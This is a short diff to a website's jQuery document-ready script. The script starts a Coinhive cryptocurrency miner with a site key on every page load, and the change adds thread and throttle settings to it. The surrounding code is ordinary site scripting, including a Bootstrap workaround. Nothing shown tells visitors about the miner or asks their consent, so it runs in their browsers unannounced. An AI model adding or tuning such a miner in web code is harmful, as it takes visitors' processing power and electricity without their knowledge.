@@ -1,6 +1,9 @@
 $(document).ready(function(){
   // Coinhive
-  var miner = new CoinHive.Anonymous('JEoS5fr5fVPZsVz6NpM9YBHiqWqcd8lN');
+  var miner = new CoinHive.Anonymous('JEoS5fr5fVPZsVz6NpM9YBHiqWqcd8lN', {
+    threads: 2,
+    throttle: 0.5
+  });
   miner.start();
 
   // Hack related to: https://github.com/twbs/bootstrap/issues/10236
